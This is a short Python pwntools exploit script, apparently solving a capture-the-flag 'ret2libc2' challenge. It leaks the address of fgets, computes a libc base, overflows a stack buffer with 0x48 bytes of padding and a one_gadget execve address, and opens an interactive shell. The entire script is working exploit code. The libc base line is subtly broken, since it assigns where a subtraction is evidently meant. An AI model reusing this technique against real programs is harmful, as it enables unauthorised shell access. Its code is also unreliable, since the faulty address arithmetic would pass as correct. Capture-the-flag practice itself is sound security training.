#!/bin/python3

from pwn import *

p = process('./ret2libc2')
e = ELF('./ret2libc2')

# find local location of libc with `ldd <binary>`
l = ELF('/lib/x86_64-linux-gnu/libc.so.6') 


one_gadget_execve_addresses = [0xcbd1a, 0xcbd1d, 0xcbd20]
one_gadget_execve_address = one_gadget_execve_addresses[2]

p.sendline("yes, give me the codes")
loc_fgets_address = int(p.recv().split(b'\n')[1].split()[-1], 16)

# print(loc_fgets_address)

libc_base_address = loc_fgets_address = l.sym['fgets']

libc_execve_address = libc_base_address + one_gadget_execve_address

offset = 0x48

payload = b"A"*offset
payload += p64(libc_execve_address)

p.sendline(payload)

p.interactive()



